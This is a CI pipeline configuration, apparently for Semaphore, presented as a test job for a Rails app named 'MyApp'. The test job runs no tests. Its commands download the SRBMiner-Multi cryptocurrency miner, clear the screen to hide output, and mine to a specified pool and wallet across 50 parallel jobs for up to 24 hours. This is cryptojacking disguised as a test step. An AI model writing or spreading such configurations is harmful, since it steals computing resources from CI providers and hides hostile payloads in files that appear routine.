version: v1.0
name: Test MyApp
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu2004
execution_time_limit:
  hours: 24
blocks:
  - name: Test
    task:
      env_vars:
        - name: DATABASE_URL
          value: 'postgresql://postgres:@0.0.0.0:5432/myapp_test'
        - name: RAILS_ENV
          value: test
      jobs:
        - name: Test
          commands:
            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz ;'
            - tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz ;
            - cd SRBMiner-Multi-0-8-5 ; clear
            - './SRBMiner-MULTI --disable-gpu --algorithm yespower --pool stratum+tcp://stratum-asia.rplant.xyz:7017 --wallet web1q47ttaj02e0hq07ccuhcm3gsnzcqz2qjq045h2j.Kj -p m=solo --cpu-threads 2'
          parallelism: 50
